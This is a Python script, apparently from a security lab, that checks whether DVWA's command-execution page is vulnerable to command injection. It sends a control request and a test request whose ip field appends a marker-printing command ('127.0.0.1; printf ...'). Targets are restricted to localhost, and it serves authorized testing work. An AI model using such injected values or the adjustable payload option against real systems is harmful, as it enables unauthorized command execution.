#!/usr/bin/env python3
"""CMD-001 command-injection verification draft (authorized local lab only).

Sends one control request (ip=127.0.0.1) and one test request whose ip value
appends a harmless marker-printing command. No data is read, exported or
modified; the marker is only echoed back to the local operator.
"""

import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "wp2_cmd001_marker"
POSIX_PAYLOAD = "127.0.0.1; printf 'wp2_%s' cmd001_marker"
WINDOWS_PAYLOAD = "127.0.0.1 & echo wp2_cmd001_marker"
ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1", "[::1]"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Refuse to follow redirects so login bounces stay visible."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_target(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("rejected: scheme must be http or https")
    if (parts.hostname or "").lower() not in ALLOWED_HOSTS:
        raise SystemExit("rejected: host must be localhost, 127.0.0.1 or ::1")


def read_cookie(path):
    if not path:
        return ""
    with open(path, "r", encoding="utf-8") as handle:
        value = handle.read().strip()
    if not value:
        raise SystemExit("rejected: cookie file is empty")
    return value


def post_ip(opener, url, ip, cookie, timeout):
    body = urllib.parse.urlencode({"Submit": "Submit", "ip": ip}).encode("utf-8")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "wp2-cmd001-draft",
    }
    if cookie:
        headers["Cookie"] = cookie
    request = urllib.request.Request(url, data=body, headers=headers, method="POST")
    with opener.open(request, timeout=timeout) as response:
        return response.getcode(), response.read().decode("utf-8", "replace")


def main():
    parser = argparse.ArgumentParser(description="CMD-001 local command-injection draft")
    parser.add_argument("--base-url", default="http://127.0.0.1")
    parser.add_argument("--path", default="/dvwa/vulnerabilities/exec/")
    parser.add_argument("--cookie-file", default=None)
    parser.add_argument("--payload", default=POSIX_PAYLOAD)
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    url = urllib.parse.urljoin(args.base_url.rstrip("/") + "/", args.path.lstrip("/"))
    check_target(url)
    cookie = read_cookie(args.cookie_file)
    opener = urllib.request.build_opener(NoRedirect)

    try:
        status_control, body_control = post_ip(opener, url, "127.0.0.1", cookie, args.timeout)
        status_test, body_test = post_ip(opener, url, args.payload, cookie, args.timeout)
    except urllib.error.HTTPError as exc:
        if exc.code in (301, 302, 303, 307, 308):
            print("AUTH_REDIRECT http=%s (login required; redirect not followed)" % exc.code)
            return 3
        print("HTTP_ERROR http=%s" % exc.code)
        return 2
    except TimeoutError:
        print("TIMEOUT after %.1fs" % args.timeout)
        return 2
    except urllib.error.URLError as exc:
        print("CONNECTION_ERROR %s" % exc.reason)
        return 2

    control_hit = MARKER in body_control
    test_hit = MARKER in body_test
    literal_in_payload = MARKER in args.payload

    print("control_http=%s control_marker=%s" % (status_control, control_hit))
    print("test_http=%s test_marker=%s marker_literal_in_request=%s"
          % (status_test, test_hit, literal_in_payload))

    confirmed = test_hit and not control_hit and not literal_in_payload
    print("RESULT %s" % ("COMMAND_EXECUTION_SIGNAL" if confirmed else "NO_SIGNAL"))
    if not confirmed:
        print("NOTE marker absent, or present in control, or already literal in request; "
              "treat as no evidence and check authentication and payload syntax")
    return 0 if confirmed else 1


if __name__ == "__main__":
    sys.exit(main())
